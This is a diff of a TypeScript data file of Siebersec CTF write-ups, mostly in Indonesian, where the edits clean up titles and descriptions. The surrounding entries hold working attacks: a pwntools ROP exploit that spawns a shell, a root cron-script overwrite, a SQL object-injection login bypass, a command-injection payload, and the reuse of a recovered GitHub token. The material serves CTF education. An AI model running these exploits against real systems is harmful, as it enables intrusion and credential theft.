@@ -212,7 +212,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "date": "2026-06-22",
     "author": "Nattt",
     "tags": [],
-    "description": "**Category:** Forensics  \n**Flag:** `sctf{1_l0v3_gu335y_st3g0_2}`",
+    "description": "",
     "problemDescription": "**Category:** Forensics  \n**Flag:** `sctf{1_l0v3_gu335y_st3g0_2}`",
     "tools": [],
     "analysis": "",
@@ -265,18 +265,18 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "date": "2026-06-22",
     "author": "Nattt",
     "tags": [],
-    "description": "The challenge provides a PDF file `lbng.pdf`.",
+    "description": "",
     "problemDescription": "The challenge provides a PDF file `lbng.pdf`.",
     "tools": [],
     "analysis": "Using `grep`, I found that the file contains two `%%EOF` markers and two `startxref` pointers, which indicates that the PDF has been updated incrementally.\n\n```bash\ngrep -aob \"%%EOF\" lbng.pdf\n```\n\nThis suggests that the \"lost\" content might be in the first version of the PDF.",
     "solution": [
       {
-        "title": "2. Extracting the First Version",
+        "title": "Extracting the First Version",
         "content": "I extracted the first version of the PDF by taking everything up to the first `%%EOF`.",
         "code": "head -c 2381 lbng.pdf > lbng_v1.pdf"
       },
       {
-        "title": "3. Decompressing the Streams",
+        "title": "Decompressing the Streams",
         "content": "Upon decompressing the streams in the first version (specifically object 5, which corresponds to the page contents), I found several suspicious strings interleaved with the text:\n\n- `sct`\n- `f{m:3t4d4ta_`\n- `r3v34l5_`\n- `4_`\n- `lo7}`\n\nIn the second version of the PDF, these strings were replaced with empty strings `()`, confirming they were indeed part of the flag."
       }
     ],
@@ -407,7 +407,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
   },
   {
     "id": "siebersecctf-misc-acidxlizyuri",
-    "title": "Acid x Liz Yuri??? - Misc",
+    "title": "Acid x Liz Yuri???",
     "ctfName": "Siebersec CTF",
     "category": "Misc",
     "difficulty": "Medium",
@@ -415,7 +415,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "date": "2026-06-22",
     "author": "Nattt",
     "tags": [],
-    "description": "Challenge ini adalah puzzle cryptarithmetic yang dibungkus dengan tema lagu-lagu YurryCanon, terutama \"Acid x Liz\" dan \"Alice in Freezer\".",
+    "description": "",
     "problemDescription": "Challenge ini adalah puzzle cryptarithmetic yang dibungkus dengan tema lagu-lagu YurryCanon, terutama \"Acid x Liz\" dan \"Alice in Freezer\".",
     "tools": [],
     "analysis": "",
@@ -451,15 +451,15 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "analysis": "",
     "solution": [
       {
-        "title": "1. Tahap Enumerasi & Analisis (Reconnaissance)",
+        "title": "Tahap Enumerasi & Analisis (Reconnaissance)",
         "content": "Setelah berhasil masuk ke server tantangan menggunakan koneksi netcat, kita mendapati diri kita berada di dalam sesi shell pengguna biasa bernama guest:\n\n```bash\nguest@7595d0499245:~$ whoami\nguest\n```\n\nDi dalam direktori `/home`, terdapat dua pengguna terdaftar yaitu guest dan alice:\n\n```bash\nguest@7595d0499245:~$ ls -la /home\ntotal 24\ndrwxr-xr-x 1 root  root  4096 Jun 16 11:35 .\ndrwxr-xr-x 1 root  root  4096 Jun 17 09:07 ..\ndrwxr-xr-x 1 alice alice 4096 Jun 16 11:35 alice\ndrwxr-xr-x 1 guest guest 4096 Jun 16 11:35 guest\n```\n\nMelihat ke dalam direktori `/home/alice`, terdapat file bendera target `flag.txt` dengan izin akses `-r--------` (hanya bisa dibaca oleh pemiliknya, yaitu alice):\n\n```bash\nguest@7595d0499245:~$ ls -la /home/alice\ntotal 24\ndrwxr-xr-x 1 alice alice 4096 Jun 16 11:35 .\n-r-------- 1 alice alice   29 Jun 16 11:35 flag.txt\n```\n\nSaat mencoba membacanya langsung, kita mendapatkan pesan error karena kita tidak memiliki izin akses yang cukup:\n\n```bash\nguest@7595d0499245:~$ cat /home/alice/flag.txt\ncat: /home/alice/flag.txt: Permission denied\n```"
       },
       {
-        "title": "2. Menemukan Celah Keamanan (Vulnerability Identification)",
+        "title": "Menemukan Celah Keamanan (Vulnerability Identification)",
         "content": "Petunjuk dari tantangan ini menyebutkan tentang aktivitas otomatisasi sampah (\"AUTOMATICALLY take out the trash\"). Berdasarkan hal tersebut, kita memeriksa konfigurasi Cron Jobs di server Linux ini.\n\nDitemukan sebuah file konfigurasi cron khusus bernama `dustbin` di `/etc/cron.d/`:\n\n```bash\nguest@7595d0499245:~$ cat /etc/cron.d/dustbin\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n* * * * * root /opt/dustbin/empty_trash.sh >/dev/null 2>&1\n```\n\n**Analisis Cron Job**:\n- **Jadwal** (`* * * * *`): Skrip dijalankan secara berkala setiap menit.\n- **Pengguna** (`root`): Skrip dijalankan dengan hak akses tertinggi, yaitu root.\n- **Target Skrip**: `/opt/dustbin/empty_trash.sh`.\n\nKetika kita memeriksa hak izin akses (file permissions) dari file `/opt/dustbin/empty_trash.sh`, ditemukan kelemahan yang sangat fatal:\n\n```bash\nguest@7595d0499245:~$ ls -la /opt/dustbin\ntotal 12\ndrwxr-xr-x 1 root root 4096 Jun 16 11:35 .\ndrwxr-xr-x 1 root root 4096 Jun 16 11:35 ..\n-rwxrwxrwx 1 root root   34 Jun 16 11:35 empty_trash.sh\n```\n\nIzin akses skrip tersebut diatur sebagai `rwxrwxrwx` (777), yang berarti semua pengguna (termasuk kita, guest) memiliki hak penuh untuk membaca, mengeksekusi, dan menulis/mengedit isi skrip tersebut."
       },
       {
-        "title": "3. Langkah Eksploitasi (Exploitation)",
+        "title": "Langkah Eksploitasi (Exploitation)",
         "content": "Karena kita dapat memodifikasi isi skrip yang akan otomatis dieksekusi oleh root setiap menit, kita dapat menyuntikkan perintah berbahaya (Command Injection / Script Overwrite) ke dalam file `/opt/dustbin/empty_trash.sh`.\n\n**Langkah 1: Mempersiapkan Payload**\n\nKita mengubah isi skrip tersebut untuk membaca isi file `flag.txt` milik alice, menyalinnya ke direktori `/tmp/flag.txt` yang bersifat publik, dan mengubah izin aksesnya agar dapat dibaca oleh siapa saja (777):\n\n```bash\necho -e '#!/bin/bash\\ncat /home/alice/flag.txt > /tmp/flag.txt\\nchmod 777 /tmp/flag.txt' > /opt/dustbin/empty_trash.sh\n```\n\nVerifikasi isi skrip untuk memastikan perintah sudah masuk:\n\n```bash\nguest@7595d0499245:~$ cat /opt/dustbin/empty_trash.sh\n#!/bin/bash\ncat /home/alice/flag.txt > /tmp/flag.txt\nchmod 777 /tmp/flag.txt\n```\n\n**Langkah 2: Menunggu Eksekusi Scheduler (Cron Job)**\n\nKarena cron job berjalan di latar belakang setiap pergantian menit, kita menunggu maksimal 60 detik sampai server mengeksekusi skrip modifikasi kita. Kita bisa memantaunya dengan perintah looping:\n\n```bash\nwhile true; do if [ -f /tmp/flag.txt ]; then echo -e \"\\n[+] FLAG DITEMUKAN:\"; cat /tmp/flag.txt; break; fi; echo -n \".\"; sleep 1; done\n```\n\nSetelah beberapa detik berjalan, cron job berhasil dipicu oleh sistem, menyalin isi flag, dan memuntahkannya ke terminal kita."
       }
     ],
@@ -524,19 +524,19 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "analysis": "",
     "solution": [
       {
-        "title": "1. Informasi Biner & Mitigasi Keamanan",
+        "title": "Informasi Biner & Mitigasi Keamanan",
         "content": "Sebelum melangkah ke eksploitasi, pemeriksaan awal terhadap biner `chal` menunjukkan konfigurasi proteksi yang sangat ketat:\n- **Arch**: `amd64-64-little` (64-bit)\n- **RELRO**: `Full RELRO` (Global Offset Table bersifat read-only, mencegah GOT overwrite)\n- **Stack**: `Canary found` (Mencegah modifikasi langsung pada return address tanpa bypass)\n- **NX**: `NX enabled` (Stack tidak dapat dieksekusi, membutuhkan ROP)\n- **PIE**: `PIE enabled` (Posisi biner acak di memori akibat pengaruh ASLR)"
       },
       {
-        "title": "2. Analisis Kerentanan (Vulnerability Analysis)",
+        "title": "Analisis Kerentanan (Vulnerability Analysis)",
         "content": "Melalui bedah kode menggunakan analisis statis (reverse engineering), ditemukan dua titik kerentanan utama yang saling berkaitan di dalam fungsi `main`:\n\n**A. Format String Vulnerability (Information Leak)**\nProgram mencetak input nama pengguna secara langsung menggunakan fungsi `printf` tanpa menggunakan format penentu (format specifier):\n```asm\nlea rax, [format]\nmov rdi, rax\ncall sym.imp.printf  ; Ekivalen dengan printf(format)\n```\nKarena parameter dikontrol sepenuhnya oleh pengguna, kita bisa menyisipkan penentu format seperti `%p` untuk membocorkan nilai registers dan stack memori. Ini adalah kunci untuk melewati proteksi Canary dan ASLR.\n\n**B. Integer Underflow & Stack Buffer Overflow**\nProgram meminta ukuran alokasi memori melalui fungsi `get_int()` dan membatasi input maksimal sebesar `0x4f` (79 desimal) menggunakan tipe data bertanda (`signed integer`):\n```asm\ncall sym.get_int\ncmp dword [var_a4h], 0x4f\njg 0x12f6  ; Jika nilai input > 79, program melompat melewati fgets\n```\nJika kita memasukkan nilai negatif seperti `-1`, kondisi `jg` (Jump if Greater) tidak akan terpenuhi karena $-1 < 79$.\nNamun, sesaat sebelum fungsi `fgets` dipanggil untuk membaca payload, program melakukan konversi nilai tersebut menggunakan instruksi `movzx` (Move with Zero-Extend) dari register 16-bit (`ax`) ke register 32-bit (`ecx`):\n```asm\nmov eax, dword [var_a4h]\nmovzx ecx, ax  ; Nilai -1 (0xffffffff) dikonversi mengambil 16-bit bawah menjadi 0xffff (65535)\nmov esi, ecx   ; Memasukkan ukuran baru ke dalam argumen size fgets\ncall sym.imp.fgets\n```\nInstruksi `movzx` mengubah nilai `-1` menjadi `65535`. Karena kapasitas buffer `s` di stack hanya dialokasikan sebesar 88 byte (dari alamat `rbp-0x60` ke posisi Canary di `rbp-0x8`), batas baca `65535` byte dari `fgets` memberikan kita celah Stack-based Buffer Overflow yang sangat besar untuk mengontrol Return Address (RIP)."
       },
       {
-        "title": "3. Strategi Eksploitasi (Exploit Strategy)",
+        "title": "Strategi Eksploitasi (Exploit Strategy)",
         "content": "**Langkah 1: Membocorkan Canary & Alamat Libc**\n- Jarak dari format ke Canary (`rbp-0x8`) adalah $0\\text{xa0} - 0\\text{x8} = 0\\text{x98}$ byte (152 desimal), yang setara dengan 19 slot stack 64-bit. Posisi Canary berada tepat pada indeks format string `%27$p`.\n- Posisi Return Address utama berada tepat pada indeks format string `%29$p`.\n- Jarak konstan (offset) dari alamat leak indeks 29 ke Libc Base pada biner `libc.so.6` (GLIBC 2.39) adalah `0x2a578`.\n\n**Langkah 2: Penanganan Badchar (\\x0a)**\nFungsi `fgets` berhenti membaca input jika mendeteksi byte Newline (`\\x0a`). Karena ASLR mengacak memori, ada kemungkinan alamat Canary atau Libc mengandung byte `0x0a` secara acak. Skrip eksploitasi melakukan looping connection secara otomatis sampai mendapatkan alamat yang bersih dari badchar `\\x0a`.\n\n**Langkah 3: ROP Chain & Penyelarasan Stack (MOVAPS Fix)**\n- Isi buffer `s` dengan padding sampah sebanyak 88 byte.\n- Masukkan nilai Canary remote yang berhasil dibocorkan.\n- Masukkan dummy data 8 byte untuk menimpa posisi Saved RBP.\n- Masukkan gadget `ret` ekstra untuk meluruskan Stack Alignment kelipatan 16-byte.\n- Masukkan gadget `pop rdi; ret` untuk menyuplai argumen pertama ke fungsi `system`.\n- Masukkan alamat string `\"/bin/sh\"` dan panggil `system()`."
       },
       {
-        "title": "4. Kode Eksploitasi Akhir (Python Script)",
+        "title": "Kode Eksploitasi Akhir (Python Script)",
         "content": "Berikut adalah kode eksploitasi final menggunakan pustaka pwntools:",
         "code": "from pwn import *\nimport time\n\nelf = ELF('./chal')\nlibc = ELF('./libc.so.6')\ncontext.binary = elf\n\noffset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29\n\nwhile True:\n    try:\n        # Menghubungkan ke server tantangan remote\n        p = remote('chal.sieberr.live', 21003)\n        \n        # 1. Bocorkan Canary & Alamat Libc Remote\n        p.sendlineafter(b\"What is your name?\", b\"%27$p %29$p\")\n        p.recvuntil(b\"Welcome, \")\n        leak_data = p.recvline().strip().split()\n        \n        canary = int(leak_data[0], 16)\n        leak_libc = int(leak_data[1], 16)\n        libc.address = leak_libc - offset_libc\n        \n        # 2. Ambil Gadget ROP dari Libc terhitung\n        rop = ROP(libc)\n        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n        ret = rop.find_gadget(['ret'])[0]\n        bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\n        system_addr = libc.symbols['system']\n        \n        # Saringan Badchar \\x0a (Memastikan payload tidak terpotong prematur oleh fgets)\n        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\n        if b'\\x0a' in check_bytes:\n            p.close()\n            continue\n            \n        log.success(f\"Libc Base Remote Sukses: {hex(libc.address)}\")\n        log.success(f\"Canary Remote Sukses: {hex(canary)}\")\n        \n        # 3. Strukturisasi Payload ROP (Padding Buffer: 88 byte)\n        payload = b\"A\" * 88\n        payload += p64(canary)\n        payload += b\"B\" * 8          # Saved RBP\n        payload += p64(ret)          # Penyelaras Stack 16-byte (MOVAPS Fix)\n        payload += p64(pop_rdi)       # Konfigurasi parameter fungsi\n        payload += p64(bin_sh)        # RDI = Alamat \"/bin/sh\"\n        payload += p64(system_addr)  # Panggil system()\n        \n        # 4. Kirim serangan pemicu Integer Underflow\n        p.sendlineafter(b\"How much space do you want?\", b\"-1\")\n        p.sendline(payload)          \n        \n        # Berikan jeda transmisi soket agar proses perpindahan ke /bin/sh stabil\n        time.sleep(0.5)\n        p.clean(timeout=0.5)\n        \n        log.info(\"Membuka interaksi Shell...\")\n        p.interactive()\n        break\n        \n    except Exception:\n        try: p.close()\n        except: pass"
       },
@@ -560,7 +560,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "date": "2026-06-22",
     "author": "Nattt",
     "tags": [],
-    "description": "if after running `pwninit` your patched binary cannot run, try doing `patchelf --force-rpath --set-rpath '.' <patched binary name>`",
+    "description": "",
     "problemDescription": "if after running `pwninit` your patched binary cannot run, try doing `patchelf --force-rpath --set-rpath '.' <patched binary name>`",
     "tools": [],
     "analysis": "",
@@ -618,7 +618,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "date": "2026-06-22",
     "author": "Nattt",
     "tags": [],
-    "description": "Challenge ini adalah sebuah file Python bytecode (`chall.pyc`) yang dikompilasi untuk Python 3.12.",
+    "description": "",
     "problemDescription": "Challenge ini adalah sebuah file Python bytecode (`chall.pyc`) yang dikompilasi untuk Python 3.12.",
     "tools": [],
     "analysis": "Setelah melakukan disassembly menggunakan module `dis` di Python, ditemukan tiga fungsi utama:\n1. `enc(a)`: Fungsi enkripsi awal yang tampak sangat sederhana (hanya XOR dengan key).\n2. `main()`: Fungsi utama yang meminta input flag dan memvalidasinya.\n3. `_()`: Fungsi yang dipanggil sebelum `main()` dan melakukan manipulasi memory menggunakan `ctypes`.\n\nJika kita mencoba menghitung flag secara naif dari fungsi `enc` yang terlihat di disassembly awal, kita akan mendapatkan:\n`sctf{this_is_not_the_real_flag!!}`.",
@@ -790,7 +790,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
   },
   {
     "id": "siebersecctf-web-cpstore",
-    "title": ": CP Store",
+    "title": "CP Store",
     "ctfName": "Siebersec CTF",
     "category": "Web",
     "difficulty": "Medium",
@@ -804,12 +804,12 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "analysis": "",
     "solution": [
       {
-        "title": "1. SQL Injection (mysql2 Object Injection)",
+        "title": "SQL Injection (mysql2 Object Injection)",
         "content": "Pada file `routes/auth.js`, proses login menggunakan `db.query` dengan placeholder `?`. Namun, aplikasi menggunakan `express.urlencoded({ extended: true })`, yang memungkinkan pengiriman objek melalui body request.\n\nLibrary `mysql2` memiliki fitur (atau perilaku) di mana jika sebuah objek dilewatkan ke placeholder `?`, ia akan diserialisasi menjadi format `key = value`. Dengan mengirimkan `password[password]=1`, query akan berubah menjadi:\n`SELECT * FROM users WHERE username = 'techie_ernie67' and password = password = 1 LIMIT 1`\nDalam MySQL, `password = password` bernilai `true` (selama tidak NULL), dan `true = 1` juga bernilai `true`. Hal ini memungkinkan bypass login tanpa mengetahui password asli user `techie_ernie67`.",
         "code": "const [rows] = await db.query(\n  \"SELECT * FROM users WHERE username = ? and password = ? LIMIT 1\",\n  [username, password]\n);"
       },
       {
-        "title": "2. Discount Logic Flaw",
+        "title": "Discount Logic Flaw",
         "content": "Setelah login, user memiliki saldo default 100. Item `FLAG` berharga 1000. Terdapat fitur untuk mendapatkan voucher diskon 10% (`0.1`). \nDi `routes/cart.js`, total harga dihitung dengan menjumlahkan semua diskon yang ada di session:\n\nKarena kita bisa meminta voucher baru berkali-kali (`/voucher/issue`), kita bisa mengumpulkan 10 voucher unik (karena ada klaim `iat` di JWT) untuk mendapatkan diskon total 100% (`1.0`), sehingga harga `FLAG` menjadi 0.",
         "code": "const discount = Object.values(req.session?.vouchers ?? {}).reduce((sum, discount) => sum + discount, 0);\n// ...\ntotal *= 1 - Math.min(discount, 1);"
       },
@@ -837,7 +837,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "date": "2026-06-22",
     "author": "Nattt",
     "tags": [],
-    "description": "Vulnerability: **Command Injection** lewat **Array Parameter Bypass**.",
+    "description": "",
     "problemDescription": "Vulnerability: **Command Injection** lewat **Array Parameter Bypass**.",
     "tools": [],
     "analysis": "Aplikasi Node.js ini gunain `child_process.exec` buat ngejalanin command `ping`. Ada filter karakter yang cukup ketat di variabel `url`:\n```javascript\nfor (const c of [\";\", \"(\", \")\", \"`\", \"|\", \"&\", \"$\", \" \", \"\\t\", \"\\n\", \"\\r\"]) {\n  if (url.includes(c)) {\n      return res.render(\"index\", { output: null, error: \"Contraband detected!\" })\n  }\n}\n```\nTapi, filter ini cuma efektif kalo `url` itu string. Karena aplikasi ini pake Express, kita bisa ngirim `url` sebagai **Array** dengan cara ngirim query param yang sama berkali-kali (`?url=...&url=...`).\n\nKalo `url` itu Array, method `url.includes(c)` bakal ngecek apakah ada salah satu elemen di array yang **sama persis** sama karakter `c`. Jadi kalo kita kirim `;cat<flag.txt`, pengecekan bakal return `false` karena string `;cat<flag.txt` gak sama persis sama `;`.\n\nWaktu Array ini dimasukin ke template literal:\n```javascript\nexec(\"ping -c 1 -W 2 \" + url, ...)\n```\nNode.js bakal otomatis nge-join array tadi pake koma (`,`). Command yang dieksekusi jadi:\n`ping -c 1 -W 2 127.0.0.1,;cat<flag.txt`\n\nDi shell (`sh`), `;` itu command separator. Jadi shell bakal nyoba ping `127.0.0.1,` (bakal gagal), terus lanjut ngejalanin `cat<flag.txt`.",
@@ -893,14 +893,14 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "lessonsLearned": []
   },
   {
-    "id": "siebersecctf-foren-",
+    "id": "siebersecctf-foren-baka-tsuushin",
     "title": "バカ通信",
     "category": "Foren",
     "difficulty": "Medium",
     "points": 0,
     "date": "2026-07-08",
     "author": "Nattt",
-    "ctfName": "SiebersecCTF",
+    "ctfName": "Siebersec CTF",
     "tags": [],
     "description": "File yang dikasih cuma satu image EWF:",
     "problemDescription": "File yang dikasih cuma satu image EWF:\n\n```bash\nrtk file idiot_communication.E01\n```\n\nHasilnya EnCase/FTK image. Setelah di-mount lewat `ewfmount`, volume di dalamnya ternyata satu NTFS dan ada user `John Rich`.\n\n```bash\nmkdir -p ewf\nrtk ewfmount idiot_communication.E01 ewf\nrtk fsstat ewf/ewf1 | head\nrtk fls ewf/ewf1 10411\n```\n\nTarget challenge bilang kredensial GitHub ada di device ini, jadi fokusnya ke profil user. Repo di `Documents/repos/NOTTheFlag` cuma decoy. Yang kepakai justru file terhapus dari profil user.\n\n```bash\nmkdir -p recovered_user\nrtk tsk_recover -e -d 10516 ewf/ewf1 recovered_user\n```\n\nSetelah recovery, cari token GitHub:\n\n```bash\npython3 - <<'PY'\nfrom pathlib import Path\nfor p in Path('recovered_user').rglob('*'):\n    if p.is_file() and p.stat().st_size < 5_000_000:\n        try:\n            data = p.read_bytes()\n        except Exception:\n            continue\n        for needle in [b'github_pat_', b'ghp_']:\n            if needle in data:\n                print(p)\n                break\nPY\n```\n\nHit penting muncul di cache WebView:\n\n```text\nrecovered_user/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalState/EBWebView/Default/Cache/Cache_Data/data_1\n```\n\nExtract string di file itu:\n\n```bash\nstrings -a recovered_user/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalState/EBWebView/Default/Cache/Cache_Data/data_1 | grep github_pat_\n```\n\nKeluar token PAT GitHub utuh. Token itu ternyata pernah diketik ke Bing search, jadi kesimpan di cache request URL.\n\nValidasi token ke GitHub API:\n\n```bash\nTOKEN='github_pat_...redacted...'\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Accept: application/vnd.github+json\" \\\n  https://api.github.com/user\n```\n\nLanjut list repo private milik akun itu:\n\n```bash\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Accept: application/vnd.github+json\" \\\n  'https://api.github.com/user/repos?visibility=all&affiliation=owner,collaborator,organization_member&per_page=100'\n```\n\nAda repo private `idiot-communication`, dan field `description` langsung berisi flag:\n\n```text\n\"description\": \"sctf{0n1y_4n_idi0t_1s_th1s_uns3cur3}\"\n```\n\nFlag:\n\n```text\nsctf{0n1y_4n_idi0t_1s_th1s_uns3cur3}\n```",
@@ -913,13 +913,13 @@ export const siebersecCtfWriteups: WriteUp[] = [
   },
   {
     "id": "siebersecctf-crypto-thinkingspaceii-dist",
-    "title": ": Thinking Space II (Crypto Challenge - SiebersecCTF)",
+    "title": "Thinking Space II (Crypto Challenge - SiebersecCTF)",
     "category": "Crypto",
     "difficulty": "Medium",
     "points": 0,
     "date": "2026-07-08",
     "author": "Nattt",
-    "ctfName": "SiebersecCTF",
+    "ctfName": "Siebersec CTF",
     "tags": [],
     "description": "Writeup: Thinking Space II (Crypto Challenge - SiebersecCTF)",
     "problemDescription": "Writeup: Thinking Space II (Crypto Challenge - SiebersecCTF)\n\nTantangan kriptografi Thinking Space II adalah sebuah jebakan (red herring) klasik. Meskipun diberikan file uov.py yang berisi implementasi skema kriptografi Unbalanced Oil and Vinegar (UOV) pasca-kuantum sepanjang ratusan baris, kerentanan sebenarnya tidak ada hubungannya dengan kelemahan matematis algoritma tersebut. Celahnya murni berada pada penanganan tipe data di Python 3.\n\n1. Analisis Kerentanan (Type Confusion)\n\nMari kita bedah file eksekusi utama chall.py:\n\nthought = b'I am thinking of the flag'\nprint(pk.hex())\n\nmsg = input('msg: ')\nassert msg != thought\nprint(uov.sign(msg.encode(),sk,pk).hex())\n\n\nTerdapat dua mekanisme krusial di sini:\n\nVariabel thought dideklarasikan secara eksplisit sebagai tipe data bytes (ditandai dengan prefiks b'').\n\nProgram meminta input dari pengguna menggunakan fungsi bawaan input(). Di Python 3, fungsi input() selalu mengembalikan tipe data string (str), terlepas dari apa pun yang kita ketik.\n\nKetika program menjalankan baris assert msg != thought, Python membandingkan objek str dengan objek bytes. Karena kedua tipe data ini berbeda secara fundamental dalam arsitektur Python 3, perbandingan \"I am thinking of the flag\" != b\"I am thinking of the flag\" akan selalu dievaluasi sebagai True.\n\nBerkat type confusion ini, asersi keamanan berhasil dilewati. Setelah lolos, program menjalankan msg.encode() yang mengubah string kita kembali menjadi bytes, yang mana isinya sekarang identik $100\\%$ dengan variabel thought. Server pun dengan senang hati membuatkan tanda tangan digital asli untuk kita.\n\n2. Alur Eksploitasi\n\nEksploitasi dapat dilakukan secara sangat sederhana tanpa perlu membongkar algoritma UOV:\n\nBypass PoW: Selesaikan Proof of Work standar menggunakan skrip curl yang disediakan.\n\nKumpulkan Public Key: Simpan Public Key (pk) yang dicetak pertama kali oleh server.\n\nPicu Type Confusion: Saat server meminta input msg: , kita cukup mengetikkan string yang sama persis dengan target:\nI am thinking of the flag\nKarena input ini adalah string, ia lolos dari blokade assert.\n\nTangkap Tanda Tangan: Server akan merespons dengan mencetak signature dalam format hex untuk pesan kita.\n\nVerifikasi Flag: Saat server beralih ke blok kode verifikasi dan meminta sig: , kita berikan kembali string hex signature yang baru saja kita dapatkan.\n\nServer memverifikasi tanda tangan tersebut terhadap kunci publik dan pesan thought. Karena valid, server membuka dan memberikan isi flag.txt.\n\n3. Skrip Otomatisasi (solve.py)\n\nBerikut adalah skrip menggunakan pwntools yang secara otomatis membongkar sistem PoW (menggunakan modul subprocess untuk eksekusi bash) dan mengeksploitasi celah type mismatch dalam hitungan detik:\n\nfrom pwn import *\nimport subprocess\n\ndef solve():\n    p = remote('chal.sieberr.live', 20003)\n\n    # 1. Bypass Proof of Work (PoW)\n    p.recvuntil(b'Run the following command and input the solution below to solve the proof-of-work:\\n')\n    cmd = p.recvline().strip().decode()\n    \n    # Eksekusi command PoW secara otomatis lewat bash\n    pow_solution = subprocess.check_output(cmd, shell=True, executable='/bin/bash').strip()\n    \n    p.sendlineafter(b'> ', pow_solution)\n    p.recvuntil(b'Press enter to proceed to the challenge')\n    p.sendline(b'')\n    \n    # 2. Ambil Public Key\n    pk_hex = p.recvline().strip()\n    \n    # 3. Bypass Type Mismatch (Kirim sebagai String/Bytes mentah yang akan dibaca sebagai String oleh input())\n    payload = b'I am thinking of the flag'\n    p.sendlineafter(b'msg: ', payload)\n    \n    # 4. Tangkap Tanda Tangan Hasil Penipuan\n    sig_hex = p.recvline().strip()\n    \n    # 5. Kirim kembali Tanda Tangan dan Dapatkan Flag\n    p.sendlineafter(b'sig: ', sig_hex)\n    flag = p.recvline().strip()\n    \n    log.success(f\"FLAG DITEMUKAN: {flag.decode()}\")\n    p.close()\n\nif __name__ == '__main__':\n    solve()\n\n\nFlag: sctf{one_who_thinks_all_the_time_has_nothing_to_think_about_except_thoughts}",
@@ -928,7 +928,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "solution": [
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "from pwn import *\r\nimport subprocess\r\n\r\ndef solve():\r\n    p = remote('chal.sieberr.live', 20003)\r\n\r\n    # 1. Bypass Proof of Work (PoW)\r\n    p.recvuntil(b'Run the following command and input the solution below to solve the proof-of-work:\\n')\r\n    cmd = p.recvline().strip().decode()\r\n    log.info(f\"PoW Command: {cmd}\")\r\n    \r\n    log.info(\"Sedang menyelesaikan PoW (membutuhkan beberapa detik)...\")\r\n    # Mengeksekusi command PoW secara langsung lewat bash\r\n    pow_solution = subprocess.check_output(cmd, shell=True, executable='/bin/bash').strip()\r\n    \r\n    p.sendlineafter(b'> ', pow_solution)\r\n    p.recvuntil(b'Press enter to proceed to the challenge')\r\n    p.sendline(b'')\r\n    \r\n    # 2. Ambil Public Key\r\n    pk_hex = p.recvline().strip()\r\n    log.info(\"Public Key UOV diterima.\")\r\n    \r\n    # 3. Bypass Type Mismatch\r\n    # String 'msg' tidak akan pernah dianggap sama dengan Bytes 'thought'\r\n    payload = b'I am thinking of the flag'\r\n    p.sendlineafter(b'msg: ', payload)\r\n    \r\n    # 4. Tangkap Tanda Tangan\r\n    sig_hex = p.recvline().strip()\r\n    log.success(\"Berhasil mengelabui server untuk menandatangani pesan rahasia!\")\r\n    \r\n    # 5. Kirim kembali Tanda Tangan dan Dapatkan Flag\r\n    p.sendlineafter(b'sig: ', sig_hex)\r\n    \r\n    flag = p.recvline().strip()\r\n    log.success(f\"FLAG DITEMUKAN: {flag.decode()}\")\r\n    \r\n    p.close()\r\n\r\nif __name__ == '__main__':\r\n    solve()"
       }
     ],
@@ -944,7 +944,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "points": 0,
     "date": "2026-07-08",
     "author": "Nattt",
-    "ctfName": "SiebersecCTF",
+    "ctfName": "Siebersec CTF",
     "tags": [],
     "description": "Writeup for challenge Trojan Horsepower",
     "problemDescription": "",
@@ -969,7 +969,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import socket\r\n\r\ndef solve():\r\n    host = \"chal.sieberr.live\"\r\n    port = 23002\r\n    \r\n    phrase = \"oats invoice bridle mango pasture hoof delta saddle\\n\"\r\n    \r\n    with socket.create_connection((host, port)) as s:\r\n        # Read banner\r\n        banner = s.recv(1024).decode()\r\n        print(banner)\r\n        \r\n        # Send phrase\r\n        s.sendall(phrase.encode())\r\n        \r\n        # Read response\r\n        response = s.recv(1024).decode()\r\n        print(response)\r\n        \r\n        if \"sctf{\" in response:\r\n            import re\r\n            flag = re.search(r\"sctf\\{.*\\}\", response).group(0)\r\n            print(f\"FOUND FLAG: {flag}\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
       }
     ],
@@ -979,13 +979,13 @@ export const siebersecCtfWriteups: WriteUp[] = [
   },
   {
     "id": "siebersecctf-pwn-canaryisland-dist",
-    "title": ": CanaryIsland (Pwn Challenge - SiebersecCTF)",
+    "title": "CanaryIsland (Pwn Challenge - SiebersecCTF)",
     "category": "Pwn",
     "difficulty": "Medium",
     "points": 0,
     "date": "2026-07-08",
     "author": "Nattt",
-    "ctfName": "SiebersecCTF",
+    "ctfName": "Siebersec CTF",
     "tags": [],
     "description": "Writeup: CanaryIsland (Pwn Challenge - SiebersecCTF)",
